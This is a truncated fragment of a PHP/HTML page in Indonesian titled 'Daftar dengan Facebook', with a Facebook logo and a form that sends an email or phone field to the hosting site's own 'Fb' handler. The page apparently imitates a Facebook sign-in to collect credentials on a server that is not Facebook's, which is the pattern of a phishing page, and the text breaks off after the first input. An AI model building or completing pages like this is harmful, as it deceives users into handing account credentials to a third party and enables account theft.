<!-- My CSS -->
<link rel="stylesheet" href="<?= base_url(); ?>assets/css/fb.css">


<title>Daftar dengan Facebook</title>
</head>
...
<body>
    <div class="ws">
        ...
        <div class="container">
            <img class="logo-fb" src="<?= base_url(); ?>assets/img/facebook.png" alt="">
            <h3> Daftar dengan Facebook </h3>
            <form action="<?= base_url(); ?>Fb" method="post">
                <input class="box1" type="text" id="email" name="email" placeholder="Email atau Nomor Telepon"><br>
